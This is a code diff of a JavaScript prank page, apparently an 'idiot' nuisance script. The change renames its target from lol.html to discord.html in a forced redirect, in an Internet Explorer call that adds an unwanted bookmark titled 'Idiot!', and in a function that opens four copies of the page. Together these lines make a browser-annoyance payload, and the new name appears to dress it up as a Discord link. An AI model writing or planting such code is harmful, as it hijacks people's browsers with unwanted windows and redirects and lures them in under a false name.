@@ -1,6 +1,6 @@
 function checkAndRedirect() {
-    if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
-        window.location.href = 'lol.html';
+    if (document.hasFocus() && !window.location.pathname.includes('/discord.html')) {
+        window.location.href = 'discord.html';
     }
 }
 checkAndRedirect();
@@ -23,7 +23,7 @@ faudio.addEventListener('timeupdate', function () {
 });  
 function bookmark() {  
     if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
-        window.external.AddFavorite("lol.html", "‎‎Idiot!");  
+        window.external.AddFavorite("discord.html", "‎‎Idiot!");  
     }  
 }  
   
@@ -70,7 +70,7 @@ function openWindow(url) {
   
 function proCreate() {  
     for (let i = 0; i < 4; i++) {  
-        openWindow('lol.html');  
+        openWindow('discord.html');  
     }  
 }  
   
